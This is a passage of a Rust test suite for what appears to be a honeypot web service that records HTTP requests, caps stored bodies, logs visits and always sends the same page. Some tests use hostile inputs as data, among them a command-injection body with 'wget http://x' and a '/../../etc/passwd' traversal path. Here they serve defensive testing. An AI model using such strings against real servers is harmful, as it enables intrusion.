        assert_eq!(request.version, "HTTP/1.1");
        assert_eq!(
            request.headers,
            [pair("Host", "198.51.100.1"), pair("User-Agent", "test")]
        );
        assert!(request.body.is_empty());
        assert_eq!(request.received_bytes, SIMPLE_GET.len());
        assert!(!request.truncated);
    }

    #[test]
    fn ex6_works_with_bare_newlines() {
        let request = HttpRequest::from_head(b"GET / HTTP/1.0\nHost: x\n\n");
        assert_eq!(request.method, "GET");
        assert_eq!(request.headers, [pair("Host", "x")]);
    }

    #[test]
    fn ex6_cleans_the_target() {
        let request = HttpRequest::from_head(b"GET /\x1b[2J HTTP/1.1\r\n\r\n");
        assert_eq!(request.target, "/\\u{1b}[2J");
    }

    #[test]
    fn ex6_something_that_is_not_http_is_kept_as_the_body() {
        let probe = [
            0x16, 0x03, 0x01, 0x00, 0xa5, 0x01, b'\r', b'\n', b'\r', b'\n',
        ];
        let request = HttpRequest::from_head(&probe);
        assert_eq!(request.method, "");
        assert_eq!(request.target, "");
        assert!(request.headers.is_empty());
        assert_eq!(request.body, probe);
        assert_eq!(request.received_bytes, probe.len());
    }

    #[test]
    fn ex6_a_head_with_no_end_still_counts() {
        let request = HttpRequest::from_head(b"GET /a HTTP/1.1\r\nHost: x");
        assert_eq!(request.method, "GET");
        assert_eq!(request.headers, [pair("Host", "x")]);
        assert!(!request.truncated);
    }

    #[test]
    fn ex6_a_head_at_the_limit_with_no_end_was_cut_off() {
        let mut head = b"GET / HTTP/1.1\r\nX: ".to_vec();
        head.resize(MAX_HEAD_BYTES, b'a');
        let request = HttpRequest::from_head(&head);
        assert!(request.truncated);
        assert_eq!(request.received_bytes, MAX_HEAD_BYTES);
    }

    #[test]
    fn ex6_an_empty_head_is_an_empty_request() {
        let request = HttpRequest::from_head(b"");
        assert_eq!(request.method, "");
        assert!(request.body.is_empty());
        assert_eq!(request.received_bytes, 0);
    }

    #[test]
    fn ex7_stores_and_counts_the_body() {
        let mut request = HttpRequest::empty();
        request.add_body(b"abc");
        request.add_body(b"def");
        assert_eq!(request.body, b"abcdef");
        assert_eq!(request.received_bytes, 6);
        assert!(!request.truncated);
    }

    #[test]
    fn ex7_keeps_bytes_exactly() {
        let mut request = HttpRequest::empty();
        let hostile = [0x00, 0x1b, b'[', 0xff, b'\r', b'\n'];
        request.add_body(&hostile);
        assert_eq!(request.body, hostile);
    }

    #[test]
    fn ex7_stops_storing_at_the_limit_and_keeps_counting() {
        let mut request = HttpRequest::empty();
        request.add_body(&vec![b'a'; MAX_BODY_BYTES - 1]);
        assert!(!request.truncated);
        request.add_body(b"bcd");
        request.add_body(b"efg");
        assert_eq!(request.body.len(), MAX_BODY_BYTES);
        assert_eq!(request.body.last(), Some(&b'b'));
        assert_eq!(request.received_bytes, MAX_BODY_BYTES + 5);
        assert!(request.truncated);
    }

    #[test]
    fn ex7_exactly_at_the_limit_is_not_cut_off() {
        let mut request = HttpRequest::empty();
        request.add_body(&vec![b'a'; MAX_BODY_BYTES]);
        assert!(!request.truncated);
    }

    #[test]
    fn ex8_records_a_request_and_sends_the_page() {
        let (visit, reply) = web_visit_for(SIMPLE_GET);
        assert_eq!(visit.outcome, Outcome::Requested);
        assert_eq!(visit.service, Some(WEB_SERVICE));
        assert_eq!(request_of(&visit).target, "/index.html");
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_reads_the_body() {
        let sent = post_with_body(b"cmd=id;wget http://x");
        let (visit, _) = web_visit_for(&sent);
        let request = request_of(&visit);
        assert_eq!(request.method, "POST");
        assert_eq!(request.body, b"cmd=id;wget http://x");
        assert_eq!(request.received_bytes, sent.len());
    }

    #[test]
    fn ex8_reads_a_body_that_arrives_in_pieces() {
        let sent = post_with_body(b"0123456789");
        let mut visit = blank_visit();
        let mut reply = Vec::new();
        visit.run_web_request(&mut OneByteAtATime { bytes: &sent }, &mut reply);
        assert_eq!(request_of(&visit).body, b"0123456789");
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_reads_no_more_than_the_length_says() {
        let mut sent = post_with_body(b"abc");
        sent.extend_from_slice(b"GET /second HTTP/1.1\r\n\r\n");
        let (visit, _) = web_visit_for(&sent);
        assert_eq!(request_of(&visit).body, b"abc");
    }

    #[test]
    fn ex8_no_length_means_no_body() {
        let (visit, reply) = web_visit_for(b"POST /x HTTP/1.1\r\n\r\nstray");
        assert!(request_of(&visit).body.is_empty());
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_a_huge_body_is_counted_but_not_all_stored() {
        let body = vec![b'A'; MAX_BODY_BYTES * 3];
        let (visit, _) = web_visit_for(&post_with_body(&body));
        let request = request_of(&visit);
        assert_eq!(request.body.len(), MAX_BODY_BYTES);
        assert!(request.truncated);
        assert!(request.received_bytes > MAX_BODY_BYTES * 3);
    }

    #[test]
    fn ex8_a_body_shorter_than_promised_is_kept() {
        let (visit, reply) = web_visit_for(b"POST /x HTTP/1.1\r\nContent-Length: 100\r\n\r\nshort");
        assert_eq!(request_of(&visit).body, b"short");
        assert_eq!(visit.outcome, Outcome::Requested);
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_going_quiet_during_the_body_keeps_what_came() {
        let sent = b"POST /x HTTP/1.1\r\nContent-Length: 100\r\n\r\npart";
        let mut visit = blank_visit();
        visit.run_web_request(&mut ThenQuiet { bytes: sent }, &mut Vec::new());
        assert_eq!(request_of(&visit).body, b"part");
        assert_eq!(visit.outcome, Outcome::Requested);
    }

    #[test]
    fn ex8_sending_nothing_gets_nothing() {
        let (visit, reply) = web_visit_for(b"");
        assert_eq!(visit.outcome, Outcome::Left);
        assert_eq!(visit.service, Some(WEB_SERVICE));
        assert!(visit.http.is_none());
        assert!(reply.is_empty());
    }

    #[test]
    fn ex8_going_quiet_without_sending_is_timed_out() {
        let mut visit = blank_visit();
        visit.run_web_request(&mut ThenQuiet { bytes: b"" }, &mut Vec::new());
        assert_eq!(visit.outcome, Outcome::TimedOut);
        assert!(visit.http.is_none());
    }

    #[test]
    fn ex8_something_that_is_not_http_still_gets_the_page() {
        let (visit, reply) = web_visit_for(b"\x16\x03\x01\x00\x05hello");
        assert_eq!(visit.outcome, Outcome::Requested);
        assert_eq!(request_of(&visit).body, b"\x16\x03\x01\x00\x05hello");
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_never_sends_back_anything_that_was_sent() {
        let sent = format!(
            "GET /{MARKER} HTTP/1.1\r\nX-{MARKER}: {MARKER}\r\nContent-Length: 5\r\n\r\n{MARKER}"
        );
        let (_, reply) = web_visit_for(sent.as_bytes());
        assert!(!String::from_utf8_lossy(&reply).contains(MARKER));
        assert_eq!(reply, the_page());
    }

    #[test]
    fn ex8_every_request_gets_exactly_the_same_reply() {
        let requests: [&[u8]; 4] = [
            SIMPLE_GET,
            b"GET /../../etc/passwd HTTP/1.1\r\n\r\n",
            b"POST /cgi-bin/x HTTP/1.1\r\nContent-Length: 2\r\n\r\nhi",
            b"\x00\x01\x02\n\n",
        ];
        for request in requests {
            assert_eq!(web_visit_for(request).1, the_page());
        }
    }

    #[test]
    fn ex9_shows_the_method_and_path() {
        let request = HttpRequest::from_head(SIMPLE_GET);
        assert_eq!(
            request.screen_summary(),
            "http: GET /index.html headers=2 body=0"
        );
    }

    #[test]
    fn ex9_counts_the_body() {
        let (visit, _) = web_visit_for(&post_with_body(b"hello"));
        assert_eq!(
            request_of(&visit).screen_summary(),
            "http: POST /upload headers=1 body=5"
        );
    }

    #[test]
    fn ex9_leaves_off_the_query_string() {
        let request = HttpRequest::from_head(b"GET /a?token=secret HTTP/1.1\r\n\r\n");
        assert_eq!(request.screen_summary(), "http: GET /a headers=0 body=0");
    }

    #[test]
    fn ex9_cuts_a_long_path_short() {
        let path = "/".to_string() + &"é".repeat(MAX_SCREEN_PATH_CHARS + 20);
        let head = format!("GET {path} HTTP/1.1\r\n\r\n");
        let summary = HttpRequest::from_head(head.as_bytes()).screen_summary();
        let shown: String = path.chars().take(MAX_SCREEN_PATH_CHARS).collect();
        assert_eq!(summary, format!("http: GET {shown}... headers=0 body=0"));
    }

    #[test]
    fn ex9_a_path_at_the_limit_is_not_cut() {
        let path = "/".repeat(MAX_SCREEN_PATH_CHARS);
        let head = format!("GET {path} HTTP/1.1\r\n\r\n");
        let summary = HttpRequest::from_head(head.as_bytes()).screen_summary();
        assert_eq!(summary, format!("http: GET {path} headers=0 body=0"));
    }

    #[test]
    fn ex9_something_that_is_not_http() {
        let request = HttpRequest::from_head(b"\x16\x03\x01hello\n\n");
        assert_eq!(
            request.screen_summary(),
            "http: (not http) headers=0 body=10"
        );
    }

    #[test]
    fn ex9_marks_a_cut_off_request() {
        let body = vec![b'A'; MAX_BODY_BYTES + 1];
        let (visit, _) = web_visit_for(&post_with_body(&body));
        let summary = request_of(&visit).screen_summary();
        assert!(summary.ends_with(&format!("body={} truncated", MAX_BODY_BYTES + 1)));
    }

    // These run the whole web service over a real connection on localhost, through the worked
    // examples in `src/server.rs`.

    #[test]
    fn ex9_a_whole_request_goes_in_the_log() {
        check_the_pieces_first();
        let dir = TestDir::new("ex9-log");
        let shared = server_with_web(&dir, ShellBudget::new(1_000_000, 1_000_000, 100));

        let reply = send_for_real(&shared, &post_with_body(b"\x00evil\xff"));

        assert_eq!(reply, the_page());
        let visits = logged_visits(&dir);
        assert_eq!(visits.len(), 1);
        assert_eq!(visits[0]["service"], "http");
        assert_eq!(visits[0]["outcome"], "requested");
        assert_eq!(visits[0]["http"]["method"], "POST");
        assert_eq!(visits[0]["http"]["body"], encode_base64(b"\x00evil\xff"));
    }

    #[test]
    fn ex9_a_spent_budget_closes_without_reading() {
        check_the_pieces_first();
        let dir = TestDir::new("ex9-budget");
        let shared = server_with_web(&dir, ShellBudget::new(1, 1_000_000, 100));

        send_for_real(&shared, SIMPLE_GET);
        let second = send_for_real(&shared, SIMPLE_GET);

        assert!(second.is_empty());
        let visits = logged_visits(&dir);
        assert_eq!(visits.len(), 2);
        assert_eq!(visits[0]["outcome"], "requested");
        assert_eq!(visits[1]["outcome"], "left");
        assert_eq!(visits[1]["service"], "http");
        assert!(visits[1].get("http").is_none());
    }

    #[test]
    fn ex9_the_screen_shows_the_request() {
        let (mut visit, _) = web_visit_for(SIMPLE_GET);
        visit.time = 0;
        assert_eq!(
            screen_line(&visit),
            "1970-01-01 Requested from 127.0.x.x user=(none) password=(none) service=http http: GET /index.html headers=2 body=0"
        );
    }

    #[test]
    fn ex9_the_screen_never_shows_headers_bodies_or_query_strings() {
        let mut visit = blank_visit();
        visit.source_ip = IP_A;
        visit.outcome = Outcome::Requested;
        visit.service = Some(WEB_SERVICE);
        visit.http = Some(HttpRequest {
            method: "GET".to_string(),
            target: "/login?password=hunter2".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: vec![pair("Cookie", "session=secret123")],
            body: b"token=letmein".to_vec(),
            received_bytes: 80,
            truncated: false,
            head_bytes: 67,
        });
        let line = screen_line(&visit);
        for secret in ["hunter2", "secret123", "letmein", "Cookie", "203.0.113.1"] {
            assert!(!line.contains(secret), "{secret}: {line}");
        }
        assert!(line.contains("GET /login"), "{line}");
    }

    #[test]
    fn ex9_a_web_visit_is_written_like_this() {
        let mut visit = blank_visit();
        visit.outcome = Outcome::Requested;
        visit.service = Some(WEB_SERVICE);
        visit.http = Some(HttpRequest {
            method: "POST".to_string(),
            target: "/x".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: vec![pair("Content-Length", "2")],
            body: b"hi".to_vec(),
            received_bytes: 40,
            truncated: false,
            head_bytes: 38,
        });
        assert_eq!(
            visit.to_json_line().unwrap(),
            r#"{"time":1000,"source_ip":"127.0.0.1","outcome":"requested","username":null,"password":null,"service":"http","http":{"method":"POST","target":"/x","version":"HTTP/1.1","headers":[["Content-Length","2"]],"body":"aGk=","received_bytes":40,"truncated":false}}"#
        );
    }
}
